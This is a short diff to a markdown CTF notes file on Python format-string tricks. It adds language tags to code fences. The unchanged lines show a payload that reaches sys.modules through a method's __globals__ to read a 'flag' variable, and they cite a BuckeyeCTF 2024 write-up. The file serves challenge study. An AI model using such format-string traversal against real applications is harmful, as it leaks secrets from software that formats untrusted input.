@@ -3,7 +3,7 @@
 ## format string
 
 ### Read var
-```
+```python
 import pathlib
 a = pathlib.Path.cwd()
 print("{a.unlink.__globals__[sys].modules[flag].flag}".format(a=a))
@@ -13,7 +13,7 @@ print("{a.unlink.__globals__[sys].modules[flag].flag}".format(a=a))
 
 [BuckeyeCTF 2024](https://corgi.rip/posts/buckeye-writeups/)
 
-```
+```python
 import pathlib
 import ctypes
 a = pathlib.Path.cwd()
